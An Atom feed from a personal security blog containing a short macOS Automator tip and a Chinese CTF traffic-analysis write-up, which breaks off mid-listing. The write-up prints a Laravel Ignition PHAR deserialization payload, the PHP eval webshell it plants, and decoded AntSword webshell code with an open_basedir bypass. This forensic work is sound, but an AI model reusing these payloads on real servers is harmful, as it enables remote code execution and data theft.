<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Polo&#39;s Blog</title>
  
  
  <link href="https://polosec.github.io/atom.xml" rel="self"/>
  
  <link href="https://polosec.github.io/"/>
  <updated>2021-10-08T07:42:25.032Z</updated>
  <id>https://polosec.github.io/</id>
  
  <author>
    <name>Polo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Quick start  Captfencoder in Mac</title>
    <link href="https://polosec.github.io/2021/10/08/Quick-start-Captfencoder-in-Mac/"/>
    <id>https://polosec.github.io/2021/10/08/Quick-start-Captfencoder-in-Mac/</id>
    <published>2021-10-08T07:35:41.000Z</published>
    <updated>2021-10-08T07:42:25.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>Automator in mac<br>open automator,choose application,search shell on the top<img src="http://cdn.polowong.top/1633678583273wpowfu9o.png?imageslim" alt="paste image"><br>then type</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&#x2F;path&#x2F;to&#x2F;npm&#x2F;;cd &#x2F;path&#x2F;to&#x2F;npm&#x2F;apps ;npm start</span><br></pre></td></tr></table></figure><p>Automator doesn’t know the path of npm, so it should be exported frist.<img src="http://cdn.polowong.top/1633678772412ykmrga69.png?imageslim" alt="paste image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tools&quot;&gt;&lt;a href=&quot;#Tools&quot; class=&quot;headerlink&quot; title=&quot;Tools&quot;&gt;&lt;/a&gt;Tools&lt;/h1&gt;&lt;p&gt;Automator in mac&lt;br&gt;open automator,choose application,sear</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>绿城杯流量分析</title>
    <link href="https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2021-10-07T02:33:09.000Z</published>
    <updated>2021-10-07T13:25:07.241Z</updated>
    
    <content type="html"><![CDATA[<p>这题挺有意思的，还是按流量分析的思路来做，个人习惯先看post包<img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image">在这里看到了很多ignition之类的包，百度了下这是一个laravel的RCE。后面的包一直在向.config.php post数据，怀疑config.php是写的马，跟进去看看。使用http contains config过滤出来。<img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image">很明显是webshell了，这是在执行ls<img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image">继续跟踪这个webshell的数据包，看看有无有价值的信息。<img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image">看到了一个secret.zip，但是http对象导出并没有这玩意。继续追踪看到了pk开头的一段数据，考虑是压缩包，尝试进行还原。<img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image">需要注意的是，压缩包前后有两段字符串是蚁剑自带干扰流量特征的。还原之后是个加密的压缩包，不是伪加密，下一步的目的是找到压缩包的密码。同时需要注意的是，这里文件名和cobalt strike有关（rt废物狂喜），然后搜了下.cobaltstrike.beacon_keys这个东西是干嘛的。上述文件是一个序列化后的公钥私钥文件，CS的beacon会嵌入这个文件中的公钥，当然了，私钥是留给server自己的。下一步应该是对这个文件进行解密，获取CS的通信数据。既然知道了是cobalt strike的通信流量，那么需要找到beacon与teamserver交互的数据包，但这个前提是得到私钥。获取私钥的前提是解开压缩包的密码。下面需要做的是找压缩包的密码。<img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image">继续追踪数据包，在上面的包中看到了解压的操作。但是当时我直接对传输的数据进行URL+BASE64解码，并不能得到任何有价值的信息。那么接下来需要做的是看一看传的马的内容以及加密方式。在laravel RCE的包中可以找到payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure><p>把payload中的=00替换为空然后解base64可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">�a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~ضtest.txt\KKa~ضtesttest6z&#x3D;Jc�F��ؐ݌&amp;~�&lt;@��GBMB</span><br></pre></td></tr></table></figure><p>这写进去的应该是一个序列化对象，应该是和laravel的rce有关，我们重点关注传进去的内容。@eval(@gzinflate(base64_decode($_POST[14433])));所以需要做gzip和base64的解码才可以明白流量包中的具体内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span class="line">_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4F</span><br><span class="line">b430b310838a93&#x3D;4g</span><br><span class="line">f861d394170244&#x3D;X4Y21k</span><br><span class="line">ufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm</span><br></pre></td></tr></table></figure><p>上面是对解压包的url解码，然后gzip+base64解码尝试还原代码内容,对上面的每个参数进行解密!下面这个包是解压缩的包的解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">$ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir);</span><br><span class="line">@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">foreach($oparr as $item) &#123;</span><br><span class="line">if(!@is_writable($item)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;;</span><br><span class="line">@mkdir($tmdir);</span><br><span class="line">if(!@file_exists($tmdir)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">@chdir($tmdir);</span><br><span class="line">@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">$cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;,$tmdir);</span><br><span class="line">for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class="line">@chdir(&quot;..&quot;);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;);</span><br><span class="line">@rmdir($tmdir);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;36&quot;.&quot;4f2&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;42&quot;.&quot;ff1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2));</span><br><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br><span class="line">$envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2));</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span 